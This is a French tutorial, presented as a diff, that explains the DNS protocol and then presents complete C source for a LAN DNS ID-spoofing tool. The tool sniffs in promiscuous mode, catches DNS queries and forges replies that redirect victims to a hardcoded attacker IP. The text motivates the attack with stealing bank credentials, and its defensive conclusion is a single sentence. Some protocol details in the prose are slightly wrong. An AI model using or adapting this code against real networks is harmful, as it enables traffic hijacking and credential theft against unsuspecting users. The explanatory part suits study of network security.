@@ -1,0 +1,711 @@
+ 
+Usurpation d'identité au niveau de la couche session :  DNS cache poisoning     
+1 Etude du protocole DNS
+
+1.1 Historique des noms de domaine
+
+L'adressage IP, base de l'interconnexion, permet d'identifier de manière unique
+une machine sur un réseau. Nous pouvons, si nous le souhaitons, nous connecter
+à un site en ligne à partir de son adresse IP en saisissant dans un navigateur
+: « http ://xxx.xxx.xxx.xxx/ » (avec xxx.xxx.xxx.xxx l'adresse IP de la
+machine).
+
+ 
+
+La difficulté de mémorisation d'une adresse IP (du type 194.214.10.124) a amené
+les organismes de normalisation à se pencher sur une solution facilitant cette
+mémorisation : la création de noms de domaine. Les noms de domaines permettent
+d'associer à une adresse IP numérique, un nom simple et textuelle du type «
+www.univ-paris12.fr ». La gestion de ces noms de domaine a, dans un premier
+temps, été centralisée par le « Network Information Center » (NIC) sous forme
+d'un fichier unique : HOSTS.TXT regroupant les correspondances HostName/IP.
+
+ 
+
+Cette gestion a posé une multitude de problèmes.
+
+-         L'architecture centralisée [RFC-952, RFC-953] utilisée pour partager
+le fichier a rendu ce système inutilisable dans une perspective mondiale.
+
+-         L'augmentation du nombre de machine sur le réseau a rendu
+considérable le débit nécessaire au niveau du serveur pour l'envoi du fichier
+HOSTS.TXT vers toutes les machines du réseau.
+
+-         Le temps de mise à jour du fichier posait de réels problèmes pour les
+personnes désirant créer leur nom de domaine.
+
+ 
+
+Ces difficultés d'administration ont finalement entraîné des équipes de
+recherche à trouver de nouvelles solutions [IEN-116, RFC-799, RFC-819,
+RFC-830]. Ces recherches ont abouti sur un principe simple permettant de régir
+les noms de domaines de façon hiérarchique en utilisant le caractère « . » 
+comme séparateur de niveau hiérarchique.
+
+
+
+1.2 Objectifs de la conception du DNS
+
+Les objectifs de création du DNS ont influencé largement sa structure et ce
+pour plusieurs raisons :
+
+-         Le système conçu doit pouvoir être multi-plateforme, c'est à
+dire qu'il peut être utilisable aussi bien par des postes clients que
+par des mainframes. La compatibilité du système doit être totale pour être
+fonctionnelle.
+
+-         Les transactions avec le serveur de noms ne doivent pas être
+dépendantes du système de communication utilisé.
+
+-         Le protocole doit pouvoir gérer tout les types d'adresses de
+classe 3 (ex : IP, X25).
+
+-         Le protocole doit pouvoir servir à identifier à la fois des adresses
+de courriers électroniques ou de machines.
+
+-         L'architecture de gestion doit pouvoir supporter une grande
+quantité d'information. Nous utiliserons donc une architecture
+distribuée.
+
+-         Pour éviter tout problèmes de transcodage, les noms de domaine
+doivent être composer de caractère (« a-z » , « 1-9 » , « - »  , « . »).
+
+                                  
+
+ 
+
+1.3 Fonctionnement de l'architecture DNS
+
+Les organismes de normalisation ont définit les standards de structuration des
+domaines en définissant de manière simple la séparation des niveaux
+d'autorités.
+
+Les noms de domaines auront la forme generale suivante : 	
+
+feuille.sous-class.toplevel
+
+exemple de feuille : www,mail,pop,smtp;
+exemple de sous-class : google,romainl,redkod;
+exemple de toplevel : com,edu,fr,net;
+
+Lorsque qu'un utilisateur quelconque désire se connecter à une machine distante
+grâce à un nom de domaine, la machine cliente va dépêcher une requête de
+demande au serveur de résolution (aussi baptisé serveur DNS pour Domain Name
+Service) afin d'obtenir l'adresse IP de la machine.
+
+Le serveur va dans un premier temps vérifier si le nom de domaine recherché ne
+coïncide pas avec son domaine d'autorité, si c'est le cas il connaît l'adresse
+IP il peut donc la renvoyer, sinon il vérifie s'il ne possède pas cette adresse
+dans son « cache » mémoire, c'est à dire qu'il vérifie si le nom de domaine ne
+lui a pas déjà été demandé préalablement (auquel cas il connaît la réponse et
+il l'envoi), le cas échéant, il envoi une requête au serveur DNS lui faisant
+autorité et ceci récursivement jusqu'à ce que le domaine soit résolu.
+
+A partir de ce type de schéma les résolutions ne sont plus des problèmes, la
+mise a jour se fait rapidement, nul besoin de télécharger de fichier de taille
+importante, le traitement est dit « distribué ».
+
+
+
+
+ 
+
+1.4 Le protocole
+
+Apres avoir étudié les concepts sur la résolution nous allons nous pencher sur
+l'implémentation protocolaire du DNS a travers les réseaux IP de manière
+générale. Nous nous intéresserons surtout aux communications client/serveur.
+
+ 
+
+Le protocole DNS est situé au dessus de la couche transport du modèle OSI de
+l'ISO :
+
+		Niveau du modele OSI	|	Pile de protocole
+		________________________|_________________________	
+		5 Session		|	DNS
+		4 Transport		|	UDP
+		3 Reseaux		|	IP
+		2 Liaison de donnees	|	Ethernet
+		
+			Encapsulation du protocole DNS
+			
+
+
+			Architecture du protocole
+			
+			
+               +------------------------16 ------------------------+
+               | Transaction ID		|    Flags                 | Zone 1
+               +---------------------------------------------------+
+               | Nombre de questions   	|    Nombre de reponse RR  |
+               +---------------------------------------------------+
+               | Nombre d'authority RR  |    Nombre d'additional RR|
+               +---------------------------------------------------+
+               | Nom de l'hote a rechercher (taille variable)      | Zone 2
+               +---------------------------------------------------+
+               | Type                 	|    Class                 |
+               +---------------------------------------------------+
+               | TTL ( temps de vie de la reponse)                 |
+               +---------------------------------------------------+
+               | Long. de l'@ de resp   | Adresse rechercher(IP)   | Zone 3
+               +---------------------------------------------------+
+               | Noms de serveurs faisant authorite                | Zone 4
+	       +---------------------------------------------------+
+	       | Options                                           |
+               +---------------------------------------------------+
+               | Enregistrements additionnels                      | Zone 5
+               +---------------------------------------------------+
+               | options...                                        |
+               +---------------------------------------------------+
+
+	    
+Le protocole se divise en quatre grandes parties.
+
+- Dans la première partie (zone1) , nous retrouvons le transactionID qui permet
+de prévenir les ambiguïtés en cas de requêtes similaires de la part de deux
+machines du réseau (à l'image du champ identification du protocole IP ). Les «
+flags » permettent de définir les options générales. Les valeurs des
+indicateurs les plus fréquentes sont :
+
+		Code en Ox	|	Value
+		________________|____________________________________
+		0100		|	Question
+		8180		|	Reponse du serveur Sans erreur
+		8183		|	Reponse du serveur avec erreur
+
+
+- Dans la deuxième partie (zone2), nous retrouvons la « Query », autrement dit
+la demande adressée au serveur de résolution de noms.
+
+Le champ « nom d'hôte à rechercher » contient la requête à proprement parler.
+Le champ « type » contient un code permettant de connaître le type d'adresse à
+rechercher. Ce champ est généralement à « 1 » (pour HostAdress) sur Ethernet.
+Le champ « class » permet de définir la classe de l'adresse, sur Ethernet ce
+champ sera à « 1 » pour une classe INET qui correspond aux adresses IP.
+
+- Dans la troisième partie (zone3), nous retrouverons la réponse de la « Query
+». Cette partie est composée de plusieurs champs. Le champ « réponse » contient
+le positionnement de la « query » dans la trame. Le champ type est identique à
+celui de la zone 2. Le champ « class » est identique a celui de la zone 2. Le
+champ « Temps de vie » permet de connaître la durée de validité de la réponse
+donnée. Le champ « longueur » contient la taille de l'adresse contenue dans le
+champ « adresse recherché ».
+
+- La quatrième partie (zone4), permettra d'identifier les serveurs ayants fait
+autorité pour la réponse.
+
+
+- Enfin la dernière partie (zone5), permettra d'identifier les serveurs ayants
+participé à la résolution du nom de domaine mais ne faisant pas autorité.
+
+Il est à noter que les zones quatre et cinq ne sont pas indispensable à la
+résolution des noms de domaines. Ces champs sont facultatifs.
+
+
+2.1 Failles de sécurité
+
+2.1.1 Enjeux de la sécurité
+
+Le transport de données confidentielles à travers le réseau doit garantir à
+l'utilisateur une totale confidentialité. L'acheminement des données doit
+pouvoir se faire de façon totalement sécurisée. Nous imaginons aisément combien
+il est important de garantir un lien sécurisé lors de la communication de
+certains mots de passe, de numéros de cartes bleues ou encore de données
+stratégiques industrielles.
+
+Sachant qu'un nom de domaine garanti l'identité d'une machine sur le réseau, on
+en vient à se demander si ces noms de domaine ne peuvent pas être usurpés de
+manière à s'approprier l'identité d'un serveur.
+ 
+En s'accaparant de l'identité d'une machine, nous pourrions imaginer divers
+scénarios. En usurpant l'identité du nom de domaine d'une banque en ligne, nous
+aurions la capacité de récupérer par exemple des numéros de compte en banque ou
+encore des mots de passes permettant l'accès à des zones privées de virement de
+fonds.
+
+2.1.2 Presentation de la méthode DNS id Spoofing
+
+Cette méthode est applicable si le pirate se trouve sur le meme réseau Ethernet
+que la victime. En d'autres termes si le pirate peut sniffer les DNS QUERY
+et DNS REPLY de la victime.
+
+Cet exploit est relativement simple, il se décompose en deux phases. 
+
+La première consiste à sniffer le réseau à la recherche de DNS QUERY. Lorsque 
+l'une d'entre elles nous paraît intéressante nous allons l'analyser en 
+déterminant les adresses source et destination.
+
+La deuxième phase nous amène à envoyer une fausse réponse DNS à la victime. On 
+forge donc un paquet à la volée contenant les adresses source IP et MAC du 
+serveur DNS, les adresses destination TCP, IP et MAC de la victime. On 
+remplit le champ de réponse avec de fausses adresses (ex: la notre). Le TTL du
+header DNS sera fixé de manière à allonger le temps de vie de la réponse dans 
+la cache de la machine victime.
+
+Si notre paquet usurpé est envoyé avant la réponse du serveur DNS notre 
+réponse sera prise en compte. La machine aura donc un cache DNS empoisonné pour
+une durée égale au Time To Live du paquet.
+
+
+
+
+3 Implémentation
+
+Les trames n'étant qu'une simple suite d'octets, leurs créations en programmation 
+se résument au remplissage des différents champs d'une structure de données créées 
+en C.
+
+Cependant, le système des sockets classiques (commun à Windows et Linux) se 
+limite à l'envoi de données qui seront encapsulées par TCP/IP puis par Ethernet,
+et interdit l'accès direct au pilote de la carte réseau, ou encore aux 
+protocoles exotiques (pour l'utilisateur lambda) comme ARP.
+
+Fort heureusement, sous Linux, le système des RAW sockets permet de réaliser 
+des opérations de lecture/écriture sur le driver de la carte réseau. Les 
+données passées à une RAW socket sont envoyées sur le réseau sans aucun 
+traitement de la part du noyau (seul le CRC et les octets de synchronisation 
+sont ajoutés par la carte Ethernet), ce qui permet un contrôle complet de 
+n'importe quel protocole réseau.
+
+Nous supposons aussi que nous sommes capables d'intercepter toute trame 
+transmise sur le réseau, même si elle ne nous est pas destinée physiquement. 
+Cette opération est réalisée en faisant passer la carte réseau en mode 
+PROMISCUOUS, mode de fonctionnement qui élimine le filtrage réalisé par le 
+matériel sur les adresses destination de l'entête Ethernet.
+
+Là encore, Linux fournit un mécanisme simple pour modifier les drapeaux (flags)
+des périphériques réseau, via l'appel système ioctl().
+
+La réalisation de telles opérations n'est pas possible sous Windows de manière
+native, parce que les RAW sockets ne sont que partiellement implémentées.
+
+En revanche, un pilote capable de s'intercaler dans la pile de protocole Win32
+est disponible sur le web. WinPcap permet, par conséquent, de communiquer avec
+le pilote de la carte réseau avec autant de simplicité que sous Linux.
+
+3.1 Choix d'implémentation
+
+On utilisera la librairie WinPCap [1] pour sniffer et générer des paquets sur 
+le réseaux. Cette librairie est aussi et avant tout disponible sous linux [2].
+Elle offre une interface de communication relativement simple avec les cartes 
+réseaux.
+
+Toutes les sources seront facilement portable sous Linux.
+
+3.2 Code source du "sniffer"
+
+3.2.1 Initialisation de la carte réseau et debut de l'appel au sniffer
+
+
+---cut-------------------------------------------------------------------------
+
+LPADAPTER adapter;
+
+BOOLEAN Sniff(){
+	LPPACKET paquetrcv;
+	unsigned char tramercv[1600];
+	unsigned long BuffSize;
+	WCHAR device[512];
+	WCHAR Adapter[5][100];
+	unsigned int AdaptNumber=0;
+	unsigned int i=0;
+	unsigned int itmp=0;
+	unsigned int j=0;
+
+
+	/*********** Recup le nom des interfaces ****/
+	if((PacketGetAdapterNames((char *)device,&BuffSize))==-1){
+		printf("\n>Erreur : GetAdapterNames();");
+		return -1;
+	}
+	
+	/*********** Give Me Adaptateur *************/
+	for(i=0;i<300;i++){
+		Adapter[j][i-itmp]=device[i];
+		if(device[i]=='\0'){
+			itmp=i+1;
+			j++;
+		}
+	}
+	/*********** Choix des Adaptateurs **********/
+	AdaptNumber=0;
+
+	/*********** Open Adaptater *****************/
+	adapter = PacketOpenAdapter((char *)Adapter[AdaptNumber]);
+	if(adapter<=0){
+		printf("\n>Erreur : Ouverture de l'adaptateur !");
+		return -1;
+	}
+
+	/*********** Set In Promiscuous Mode ********/
+	if(!PacketSetHwFilter(adapter,NDIS_PACKET_TYPE_PROMISCUOUS)){
+		printf("\n>Erreur : Impossible de passer en mode Promiscuous");
+		return -1;
+	}
+
+	/*********** Allocate Packet ****************/
+	paquetrcv = PacketAllocatePacket();
+	if(!paquetrcv){
+		printf("\n>Erreur : AllocatePacket();");
+		return -1;
+	}
+
+	/*********** Initialise le paquet ***********/
+	PacketInitPacket(paquetrcv,tramercv,1600);
+	
+	/*********** Time OUT **********************/
+	if(!PacketSetReadTimeout(adapter,10000)){
+		printf("\t\n>Erreur : SetTimeOut();");
+		return -1;
+	}
+
+	/*********** Taille buffer driver***********/
+	PacketSetBuff(adapter, 512000);
+
+	/*********** PacketReceive *****************/
+	while(1){
+			if(!PacketReceivePacket(adapter,paquetrcv,TRUE)){
+			printf(">Erreur : ReceivePacket();\n");
+			return -1;
+		}
+		else{
+			if((paquetrcv->ulBytesReceived)!=0){
+				Analyse(paquetrcv);
+			}
+		}
+	}
+}
+
+---cut-------------------------------------------------------------------------
+
+3.2.2 Analyse du paquet, recherche de DNS QUERY, et appel de ForgeSendPacket
+
+Cette analyseur recherche simplement les DNS QUERY. Lorsqu'une requête a été 
+capturée elle est envoyé à ForgeSendPacket.
+
+
+---cut-------------------------------------------------------------------------
+void Analyse(LPPACKET paquet){
+	bpf_hdr *ph;
+	unsigned char * p;
+	unsigned int PckLength;
+	unsigned int PckCapLength;
+	unsigned int OffSet=0;
+	unsigned int i=0;
+	unsigned int Level4Size;
+	unsigned short HeaderLength;
+	struct hostent * h;
+
+
+	/****************** RECUP LES INFOS DU HEADER ************/
+	
+	while(OffSet<(paquet->ulBytesReceived)){
+		//printf("--------------%d -------%d\n",OffSet,paquet->ulBytesReceived);
+		ph=(bpf_hdr *)((char *)paquet->Buffer+OffSet);
+		PckLength=(ph->bh_datalen);
+		PckCapLength=(ph->bh_caplen);
+		HeaderLength=(ph->bh_hdrlen);
+		
+		/****************** RECUP UN POINTEUR SUR LA TRAME ***/
+		p =(unsigned char *)paquet->Buffer+HeaderLength+OffSet;
+
+		/****************** DECODAGE DE LA TRAME *************/
+		/**** TRAME IP ***************************************/
+		if(p[12]==0x08 && p[13]==0x00){
+				Level4Size=(*(p+16))*256+*(p+17)-20-20;
+				// -20 -> header IP, -20 ->Header TCP
+				//*(p+16))*256+*(p+17) -> Longueur Total au niveau IP
+				if(*(p+23)==0x11){
+					/* dans le sens de REQUEST ! portudp dst = 53 */
+					if((*(p+36)==0x00 && *(p+37)==53) && (*(p+26+3)==132)){
+						printf("\nDNS REQUEST FOUND !> \n>RequestFROM :");
+						for(i=0;i<4;i++){
+							if(i==3){
+								printf("%d nom:",*(p+26+i));
+							}
+							else{
+								printf("%d.",*(p+26+i));
+							}
+
+
+						}		
+						if(h = gethostbyaddr((const char *)(p+26),4,AF_INET)){
+								printf("%s \n",h->h_name );
+							}
+							else{
+								printf(" Resolve impossible ! ");
+						}
+						printf(">Request:");
+						i=0;
+						while(*(p+54+i)!=0x00){
+							// on affiche si c'est un caractere 
+							if(((*(p+54+i)>=0x61) && (*(p+54+i)<=0x7b)) || ((*(p+54+i)>=0x30) && (*(p+54+i)<=0x39))  ){
+								printf("%c",*(p+54+i));
+							}
+							else if(i!=0){
+								printf(".");
+							}
+							i++;
+						}				
+						if(!ForgeSendPacket(p)){
+							printf("\n>Erreur ForgePacket");
+						}
+						else{
+							printf("\n>ForgePacketOK");
+						}
+
+						printf("\nFIN REQUEST>__________\n");
+					}
+				}
+				
+		}
+		OffSet=Packet_WORDALIGN(OffSet+PckLength+HeaderLength);
+	}
+}
+
+---cut-------------------------------------------------------------------------
+
+3.2.3 Forge le paquet usurpé et l'envoi
+
+La préparation du paquet se limite à la création d'un buffer possédant les 
+bonnes valeurs (according to protocols). Les commentaires dans le code parlent 
+d'eux mêmes.
+
+---cut-------------------------------------------------------------------------
+
+
+// Forge Packet : Forge le paquet reply DNS a partir d'un paquet recu
+// du reseau, ensuite la fonction envoi le paquet forger sur le reseau
+// a condition que l'adaptateur soit deja selectionner
+BOOLEAN ForgeSendPacket(unsigned char * p){
+	unsigned int i;	
+	LPPACKET paquetsd;
+	unsigned char tramesd[1600];
+	printf("\n>Start PacketForge ...");
+	// ETH mac dst = mac src
+	*(tramesd+0)=*(p+6);
+	*(tramesd+1)=*(p+7);
+	*(tramesd+2)=*(p+8);
+	*(tramesd+3)=*(p+9);
+	*(tramesd+4)=*(p+10);
+	*(tramesd+5)=*(p+11);
+	// ETH mac src = mac dst	
+	*(tramesd+6)=*(p+0);
+	*(tramesd+7)=*(p+1);
+	*(tramesd+8)=*(p+2);
+	*(tramesd+9)=*(p+3);
+	*(tramesd+10)=*(p+4);
+	*(tramesd+11)=*(p+5);
+	// ETH type = type = IP
+	*(tramesd+12)=*(p+12);
+	*(tramesd+13)=*(p+13);
+	printf("\n>Start PacketForge ...ETH OK");
+	// IP version + lenght header
+	*(tramesd+14)=*(p+14);
+	// IP champs de service
+	*(tramesd+15)=*(p+15);
+	// IP Champs Longueur
+	//*(tramesd+16)=100; 
+	//*(tramesd+17)=100;
+	// IP ident
+	*(tramesd+18)=0xba;// au pif c'est l'ident o met ce qu'on veut !
+	*(tramesd+19)=0xfe;
+	// IP Not DF, not MF + IP Fgmt Offset
+	*(tramesd+20)=0;
+	*(tramesd+21)=0;
+	// IP TTL
+	*(tramesd+22)=0xfd;
+	// IP Protocol superieur
+	*(tramesd+23)=0x11;
+	// IP Checksum A calculer ?? HUM oui ... A la fin c mieux ..
+	*(tramesd+24)=0x00;
+	*(tramesd+25)=0x00;
+	// IP IP SRC = DST
+	*(tramesd+26)=*(p+30);
+	*(tramesd+27)=*(p+31);
+	*(tramesd+28)=*(p+32);
+	*(tramesd+29)=*(p+33);
+	// IP  IP DST = SRC
+	*(tramesd+30)=*(p+26);
+	*(tramesd+31)=*(p+27);
+	*(tramesd+32)=*(p+28);
+	*(tramesd+33)=*(p+29);
+	printf("\n>Start PacketForge ...IP OK");
+	// UDP Port SRC 	
+	*(tramesd+34)=*(p+36);
+	*(tramesd+35)=*(p+37);
+	// UDP port DST
+	*(tramesd+36)=*(p+34);
+	*(tramesd+37)=*(p+35);
+	// UDP Lenght A calculer 
+	//*(tramesd+38)=0;
+	//*(tramesd+39)=255;
+	// UDP CRC calcul pas obligatoire!
+	*(tramesd+40)=0;
+	*(tramesd+41)=0;
+	printf("\n>Start PacketForge ...UDP OK");
+	// DNS transaction ID
+	*(tramesd+42)=*(p+42);
+	*(tramesd+43)=*(p+43);
+	// DNS Type  0x8180 = Response
+	*(tramesd+44)=0x81;
+	*(tramesd+45)=0x80;
+	// DNS Question
+	*(tramesd+46)=0x00;
+	*(tramesd+47)=0x01;
+	// DNS Number of Answer
+	*(tramesd+48)=0x00;
+	*(tramesd+49)=0x01;
+	// DNS Number of Authority
+	*(tramesd+50)=0x00;
+	*(tramesd+51)=0x00;
+	// DNS Number of Additional Authority
+	*(tramesd+52)=0x00;
+	*(tramesd+53)=0x00;
+	// DNS Recopie la Query
+	i=0;
+	do{
+		*(tramesd+54+i)=*(p+54+i);
+		i++;
+	}while(*(p+54+i)!=0);
+	*(tramesd+54+i)=00;
+	// DNS ANSWER : Type Host address
+	*(tramesd+55+i)=00;
+	*(tramesd+56+i)=01;
+	// DNS ANSWER :  Class : INET
+	*(tramesd+57+i)=00;
+	*(tramesd+58+i)=01;
+	// DNS ANSWER :  Host address
+	*(tramesd+59+i)=0xc0;
+	*(tramesd+60+i)=0x0c;
+	// DNS ANSWER : Type : host address
+	*(tramesd+61+i)=0x00;
+	*(tramesd+62+i)=0x01;
+	// DNS ANSWER : Class : inet 
+	*(tramesd+63+i)=0x00;
+	*(tramesd+64+i)=0x01;
+	// DNS ANSWER : TTL 
+	*(tramesd+65+i)=0x00;
+	*(tramesd+66+i)=0x00;
+	*(tramesd+67+i)=0x00;
+	*(tramesd+68+i)=0x3b;
+	// DNS ANSWER : DATA LENGTH
+	*(tramesd+69+i)=0x00;
+	*(tramesd+70+i)=0x04;
+	// DNS ANSWER : REDIRECTION PIRATE !!!!! .....arf
+	*(tramesd+71+i)=194;
+	*(tramesd+72+i)=214;
+	*(tramesd+73+i)=10;
+	*(tramesd+74+i)=202;
+	printf("\n>Start PacketForge ...DNS OK");
+
+
+	// UDP size !
+	*(tramesd+38)=0x00;
+	*(tramesd+39)=74-34+i+1;// i= longueur de la query, 
+						//  69-34=35 longueur UDP + DNS sans la query
+	// IP size !
+	*(tramesd+16)=0x00;
+	*(tramesd+17)=*(tramesd+39)+20;//UDP SIZE + entete IP = UDP size + 20
+	printf("\n>Start PacketForge ...SIZE OK");
+	
+	// IP IPcheckSum 
+	*((unsigned short*)(tramesd+24))=inet_checksum((unsigned short *)(tramesd+14),20);
+	
+
+	printf("\n>Checksum Set");
+	// LONGEUR TOTAL du packet generer= IP SIZE + 14(ETH) 
+	//*(tramesd+39)+20+14
+
+	/*********** Check si l'adaptateur est OPEN **************/
+	if(!adapter){
+		printf("\n>AdapterClosed !");
+		return -1;
+	}
+
+	/*********** Allocate Nouveau Packet pour envoyer ********/
+	paquetsd = PacketAllocatePacket();
+	if(!paquetsd){
+		printf("\n>Erreur : AllocatePacket();");
+		return -1;
+	}
+	/*********** Initialise le paquet ***********/
+	PacketInitPacket(paquetsd,tramesd,*(tramesd+17)+14);
+
+	/*********** Try to send packet !************/
+	if(!PacketSendPacket(adapter,paquetsd,TRUE)){
+		printf(" \n>Erreur Send packet");
+		return -1;
+	}
+	else{
+		printf("\n>Packet Successfully Send !");
+	}
+	return 1;
+
+}
+
+---cut-------------------------------------------------------------------------
+
+3.2.4 Calcul du checksum IP
+
+Le checksum du protocole IP doit être calculé une fois le paquet forgé. On 
+utilisera donc cette fonction (extrait du kernel linux) pour cela.
+
+---cut-------------------------------------------------------------------------
+
+
+unsigned short inet_checksum(unsigned short *pkt, int n)
+{
+	register long sum;
+	unsigned short oddbyte;
+	register unsigned short answer;
+
+	/*
+	* Our algorithm is simple, using a 32-bit accumulator (sum),
+	* we add sequential 16-bit words to it, and at the end, fold back
+	* all the carry bits from the top 16 bits into the lower 16 bits.
+	*/
+
+	sum = 0;
+	while (n>1)
+	{
+		sum += *pkt++;
+		n -= 2;
+	}
+
+	/* mop up an odd byte, if necessary */
+	if (n == 1)
+	{
+		oddbyte = 0;	/* make sure top half is zero */
+		*((unsigned char *)&oddbyte) = *(unsigned char *)pkt;/* one byte only */
+		sum+=oddbyte;
+	}
+
+	/*
+	 * Add back carry outs from top 16 bits to low 16 bits.
+	 */
+
+	sum=(sum>>16)+(sum & 0xffff);	/* add high-16 to low-16 */
+	sum+=(sum >> 16);				/* add carry */
+	answer = (unsigned short)~sum;		/* ones-complement, then truncate to 16 bits */
+	
+	return answer;
+}
+
+---cut-------------------------------------------------------------------------
+
+
+Conclusion
+
+Finalement il s'avère que dans des milieux de type Ethernet la sécurité doit 
+être accrue. 
+
+
+
+
+[1] WinPcap: the Free Packet Capture Library for Windows
+http://winpcap.polito.it/
+
+
+http://sourceforge.net/projects/libpcap/
